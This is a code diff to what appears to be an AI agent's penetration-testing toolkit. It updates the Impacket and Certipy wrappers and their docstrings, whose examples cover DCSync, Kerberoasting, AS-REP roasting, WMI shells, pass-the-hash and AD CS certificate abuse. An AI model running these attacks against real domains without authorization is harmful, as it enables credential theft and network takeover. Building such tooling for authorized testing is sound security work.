@@ -786,27 +786,27 @@ class ImpacketTool(BaseTool):
     EXAMPLES:
     
     # DCSync attack
-    script="secretsdump", target="192.168.56.10", username="admin", password="Pass123", 
+    script="secretsdump", dc_ip="192.168.56.10", username="admin", password="Pass123", 
     domain="corp.local", extra_args="-just-dc"
     
     # Kerberoasting
-    script="GetUserSPNs", target="192.168.56.10", username="user", password="pass",
+    script="GetUserSPNs", dc_ip="192.168.56.10", username="user", password="pass",
     domain="corp.local", extra_args="-request -outputfile kerberoast.txt"
     
     # AS-REP Roasting
-    script="GetNPUsers", target="192.168.56.10", domain="corp.local",
+    script="GetNPUsers", dc_ip="192.168.56.10", domain="corp.local",
     extra_args="-usersfile users.txt -request -outputfile asrep.txt"
     
     # Remote shell via WMI
-    script="wmiexec", target="192.168.56.20", username="admin", password="Pass123",
+    script="wmiexec", dc_ip="192.168.56.20", username="admin", password="Pass123",
     domain="corp.local"
     
     # Pass-the-Hash psexec
-    script="psexec", target="192.168.56.20", username="Administrator",
+    script="psexec", dc_ip="192.168.56.20", username="Administrator",
     domain="corp.local", hashes=":aad3b435b51404ee"
     
     # SID lookup/brute force
-    script="lookupsid", target="192.168.56.10", username="guest", password="",
+    script="lookupsid", dc_ip="192.168.56.10", username="guest", password="",
     domain="corp.local", extra_args="500-600"
     """
     args_schema: type[BaseModel] = ImpacketInput
@@ -1542,7 +1542,7 @@ class CertipyInput(BaseModel):
     )
     username: Optional[str] = Field(
         default=None,
-        description="Username for authentication"
+        description="Username for authentication (will be formatted as username@domain if domain is provided)"
     )
     password: Optional[str] = Field(
         default=None,
@@ -1550,7 +1550,7 @@ class CertipyInput(BaseModel):
     )
     domain: Optional[str] = Field(
         default=None,
-        description="Domain name (e.g., 'corp.local')"
+        description="Domain name (e.g., 'corp.local') - will be appended to username as username@domain"
     )
     dc_ip: Optional[str] = Field(
         default=None,
@@ -1601,6 +1601,13 @@ class CertipyTool(BaseTool):
     description: str = """
     Abuse Active Directory Certificate Services (AD CS) using Certipy for various certificate-based attacks.
     
+    When to use this tool:
+    - Certipy tool is to be always used instead of suggesting bash equivalents.
+    
+    NOTE: Uses certipy v5.0.4+ syntax:
+    - Username format: username@domain (e.g., 'user@corp.local') - NO separate -domain flag
+    - Authentication flags: -u <username@domain> -p <password> -dc-ip <ip>
+
     MAIN ACTIONS:
     
     1. ENUMERATION & RECONNAISSANCE:
@@ -1705,33 +1712,34 @@ class CertipyTool(BaseTool):
         # Build certipy command
         cmd = ["certipy", action]
 
-        # Build target string for most actions (format: domain/username:password@dc_ip)
-        if action not in ["auth", "forge", "cert"] and (username or target):
-            if target:
-                # Use provided target string directly
-                cmd.append(target)
-            else:
-                # Build target string from components
-                target_str = ""
-                if domain:
-                    target_str += f"{domain}/"
-                if username:
-                    target_str += username
-                if password and not hashes:
-                    target_str += f":{password}"
-                if dc_ip:
-                    target_str += f"@{dc_ip}"
-                
-                if target_str:
-                    cmd.append(target_str)
-
-        # Add authentication for specific actions
-        if hashes and action not in ["auth", "forge"]:
-            cmd.extend(["-hashes", hashes])
-
-        # Add DC IP if not in target string
-        if dc_ip and not target and action in ["find", "shadow", "account", "ca", "template"]:
-            cmd.extend(["-dc-ip", dc_ip])
+        # Authentication using flags (certipy v5.0.4+ syntax)
+        # Note: Domain is part of username, not a separate flag
+        if action not in ["auth", "forge", "cert"]:
+            # Add username (with domain if provided)
+            if username:
+                # Format username with domain if domain is provided and not already in username
+                if domain and "@" not in username and "\\" not in username:
+                    formatted_username = f"{username}@{domain}"
+                else:
+                    formatted_username = username
+                cmd.extend(["-u", formatted_username])
+            
+            # Add password or hashes
+            if password and not hashes:
+                cmd.extend(["-p", password])
+            elif hashes:
+                cmd.extend(["-hashes", hashes])
+            
+            # Add DC IP
+            if dc_ip:
+                cmd.extend(["-dc-ip", dc_ip])
+            elif target and not dc_ip:
+                # If target is provided without dc_ip, use target as dc_ip
+                cmd.extend(["-dc-ip", target])
+        else:
+            # For auth, forge, cert actions which have different syntax
+            if dc_ip:
+                cmd.extend(["-dc-ip", dc_ip])
 
         # Action-specific parameters
         if ca:
